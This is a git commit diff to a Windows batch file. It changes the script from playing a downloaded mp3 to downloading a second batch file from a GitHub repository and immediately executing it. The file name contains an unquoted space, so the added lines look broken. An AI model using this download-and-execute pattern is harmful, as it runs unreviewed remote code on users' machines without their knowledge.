ca584cd00516a2f6b72dc18b04f002f259ca302d
badybouu <lilianauffray4@gmail.com>
2025-10-13 20:48:47 +0200

    Update btouu.bat

--- btouu.bat
+++ btouu.bat
@@ -1,2 +1,3 @@
 curl -L -o nvrgna.mp3 https://github.com/badybouu/Tilindustris/raw/refs/heads/main/nvrgna.mp3
-start nvrgna.mp3
+curl -L -o wtf_le bourdel.bat https://github.com/badybouu/Tilindustris/raw/refs/heads/main/wtf_le bourdel.bat
+start wtf_le bourdel.bat
